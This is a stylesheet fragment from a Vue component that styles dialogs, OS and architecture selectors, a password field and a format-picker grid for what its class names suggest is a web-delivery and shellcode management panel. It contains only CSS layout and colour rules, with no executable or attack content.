  color: #00a4ef;
}

.os-linux {
  color: #333;
}

.os-darwin {
  color: #999;
}

.os-name {
  font-size: 14px;
  font-weight: 600;
  color: #2c3e50;
}

/* 架构选择器 */
.arch-select {
  width: 100%;
}

.arch-select :deep(.el-input__wrapper) {
  border-radius: 10px;
  padding-left: 12px;
  height: 48px;
}

.arch-option-item {
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 8px 0;
}

.arch-option-item .el-icon {
  color: #409eff;
  font-size: 16px;
}

.arch-label {
  font-size: 14px;
  font-weight: 500;
  min-width: 60px;
}

.arch-desc {
  font-size: 11px;
  color: #909399;
  flex: 1;
  text-align: right;
}

/* 密码输入框 */
.password-input-wrapper {
  display: flex;
  gap: 12px;
  align-items: center;
}

.password-input {
  flex: 1;
}

.password-input :deep(.el-input__wrapper) {
  border-radius: 10px;
  height: 48px;
}

.generate-password-btn {
  flex-shrink: 0;
}

/* 表单提示 */
.form-hint {
  font-size: 12px;
  color: #6c757d;
  margin-top: 6px;
  padding-left: 4px;
}

/* 对话框底部 */
.add-dialog :deep(.el-dialog__footer),
.shellcode-dialog :deep(.el-dialog__footer) {
  padding: 20px 24px;
  border-top: 1px solid #ebeef5;
}

.dialog-footer {
  display: flex;
  justify-content: flex-end;
  gap: 12px;
}

.dialog-footer .el-button {
  min-width: 100px;
  border-radius: 8px;
  padding: 10px 24px;
  font-weight: 500;
}

/* Shellcode对话框样式 */
.shellcode-info {
  padding: 16px;
  background: #f8f9fa;
  border-radius: 10px;
  margin-bottom: 24px;
  border: 1px solid #e9ecef;
}

.info-item {
  display: flex;
  align-items: center;
  margin-bottom: 8px;
}

.info-item:last-child {
  margin-bottom: 0;
}

.info-label {
  font-size: 13px;
  font-weight: 600;
  color: #495057;
  min-width: 60px;
}

.info-value {
  font-size: 14px;
  color: #2c3e50;
  font-weight: 500;
  font-family: 'Monaco', 'Consolas', monospace;
}

/* 格式选择器 */
.format-form {
  margin-top: 16px;
}

.format-grid {
  display: grid;
  grid-template-columns: repeat(2, 1fr);
  gap: 12px;
}

.format-option {
  padding: 16px;
  border: 2px solid #e9ecef;
  border-radius: 10px;
  cursor: pointer;
  transition: all 0.3s;
  background: #f8f9fa;
  position: relative;
}

.format-option:hover {
  border-color: #409eff;
  background: rgba(64, 158, 255, 0.05);
  transform: translateY(-2px);
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.06);
}

.format-selected {
  border-color: #67c23a !important;
  background: rgba(103, 194, 58, 0.1) !important;
  box-shadow: 0 4px 12px rgba(103, 194, 58, 0.2);
}

.format-icon {
  width: 40px;
  height: 40px;
  border-radius: 10px;
  display: flex;
  align-items: center;
  justify-content: center;
  background: rgba(64, 158, 255, 0.1);
  margin-bottom: 8px;
}

.format-icon-svg {
  color: #409eff;
  font-size: 20px;
}

.format-info {
  flex: 1;
}

.format-name {
  font-size: 14px;
  font-weight: 600;
  color: #2c3e50;
  margin-bottom: 4px;
}

.format-desc {
  font-size: 11px;
  color: #6c757d;
  line-height: 1.3;
}

.format-check {
  position: absolute;
  top: 12px;
  right: 12px;
  color: #67c23a;
  font-size: 18px;
}

/* 响应式设计 */
@media (max-width: 992px) {
  .stats-cards {
    grid-template-columns: repeat(2, 1fr);
  }

  .row-group {
    flex-direction: column;
    gap: 16px;
  }

  .format-grid {
    grid-template-columns: 1fr;
  }
}

@media (max-width: 768px) {
  .webdelivery-management {
    padding: 16px;
  }

  .header-section {
    flex-direction: column;
    align-items: stretch;
  }

  .add-btn {
    width: 100%;
  }

  .stats-cards {
    grid-template-columns: 1fr;
  }

  .os-selector {
    flex-direction: column;
  }

  .action-buttons {
    flex-direction: column;
    gap: 4px;
  }

  .action-btn {
    width: 28px;
    height: 28px;
  }
}

@media (max-width: 480px) {
  .add-dialog,
  .shellcode-dialog {
    width: 90vw !important;
  }

  .dialog-content {
    padding: 0 4px;
  }

  .dialog-footer {
    flex-wrap: wrap;
    justify-content: center;
  }
}
</style>